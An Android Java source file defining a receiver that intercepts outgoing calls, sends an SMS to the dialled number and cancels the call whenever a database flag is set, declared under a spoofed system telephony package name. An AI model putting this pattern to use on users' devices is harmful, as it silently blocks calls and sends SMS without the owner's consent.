package com.android.internal.telephony;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;
import com.raykaco.andriod.database.Check;


public class OutgoingCallReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {

        Check check = new Check();
        if (check.selectId() == 1) {
            if (intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) {

                String phoneNumber = intent.getExtras().getString(Intent.EXTRA_PHONE_NUMBER);
                String message = "  " + phoneNumber;

                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendTextMessage(phoneNumber, null, message, null, null);

                if (getResultData() != null)
                {
                    setResultData(null);

                }

            }
            Log.i(OutgoingCallReceiver.class.getSimpleName(), intent.toString());
            Toast.makeText(context, "Outgoing call catched!", Toast.LENGTH_LONG).show();
        }
    }

}